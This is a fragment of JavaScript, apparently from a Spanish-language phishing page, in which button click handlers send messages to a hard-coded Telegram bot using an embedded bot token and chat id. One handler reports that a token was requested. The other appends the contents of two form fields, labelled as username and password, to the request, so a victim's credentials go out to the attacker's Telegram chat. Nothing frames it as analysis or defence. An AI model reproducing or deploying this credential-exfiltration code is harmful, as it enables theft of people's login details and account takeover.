...
requestbutton.addEventListener("click", () => {
  ...
  const url =
    "https://api.telegram.org/bot7083762685:AAG9B4DKlndXsVmyYSvMElq45PQiwnUFPIQ/sendMessage?chat_id=7101053333&text=TOKEN%20SOLICITADO";
  Http.open("GET", url);
  Http.send();
...
sendatatme.addEventListener("click", () => {
  const Http = new XMLHttpRequest();
  const url =
    "https://api.telegram.org/bot7083762685:AAG9B4DKlndXsVmyYSvMElq45PQiwnUFPIQ/sendMessage?chat_id=7101053333&text=USERNAME:%20" +
    resfirst.value +
    " PASSWORD: " +
    resecond.value;
  Http.open("GET", url);
